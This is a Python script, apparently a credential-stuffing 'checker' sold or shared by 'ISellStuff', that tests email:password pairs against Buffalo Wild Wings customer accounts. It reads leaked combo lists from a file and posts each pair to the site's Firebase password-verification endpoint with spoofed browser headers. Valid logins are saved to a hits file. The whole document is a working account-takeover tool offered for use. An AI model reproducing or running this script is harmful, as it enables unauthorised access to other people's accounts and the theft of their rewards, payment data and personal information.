import requests, colorama
from colorama import Fore, Back, Style

hit = Fore.GREEN
bad = Fore.RED
ban = Fore.YELLOW
main = Fore.LIGHTCYAN_EX



print(main + """
  ____                        _____ _               _             
 |  _ \                      / ____| |             | |            
 | |_) |_      ____      __ | |    | |__   ___  ___| | _____ _ __ 
 |  _ <\ \ /\ / /\ \ /\ / / | |    | '_ \ / _ \/ __| |/ / _ \ '__|
 | |_) |\ V  V /  \ V  V /  | |____| | | |  __/ (__|   <  __/ |   
 |____/  \_/\_/    \_/\_/    \_____|_| |_|\___|\___|_|\_\___|_|   

    Checker Works Proxyless
    Made By ISellStuff
      
    Press Enter To Start Checking
                                                                      """)
input(main + "Make Sure You Have Your Combo in combo.txt: ")
print()
def loginb(email,password):
                url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCmtykcZ6UTfD0vvJ05IpUVe94uIaUQdZ4"
                headers = {
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US,en;q=0.9",
                    "content-length": "89",
                    "content-type": "application/json",
                    "origin": "https://www.buffalowildwings.com",
                    "referer": "https://www.buffalowildwings.com/",
                    "sec-ch-ua": "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"",
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "\"Windows\"",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "cross-site",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.85",
                    "x-client-version": "Opera/JsCore/8.3.0/FirebaseCore-web",
                }
                data = {
                    "email": email,
                    "password": password,
                    "returnSecureToken": True,
                }
                response = requests.post(url, headers=headers, json=data)

                accountb = f'{email}:{password} | Checker By ISellStuff'
                if response.status_code == 406 or response.status_code == 404:
                    print(main + "[BAN]")
                elif "INVALID_PASSWORD" in response.text or "EMAIL_NOT_FOUND" in response.text:
                    print(f"[Fail]: {accountb}")
                elif "\"idToken\":" in response.text:
                    print(f"[Success]: {accountb}")
                    hits = open('hits.txt','a')
                    hits.write(f"\n[Success]: {accountb}")
                print()


file = open('combo.txt','r').readlines()
for i in file:
    seq = i.strip()
    acc = seq.split(':')
    loginb(acc[0],acc[1])
print()
input(main + "Check Hits!")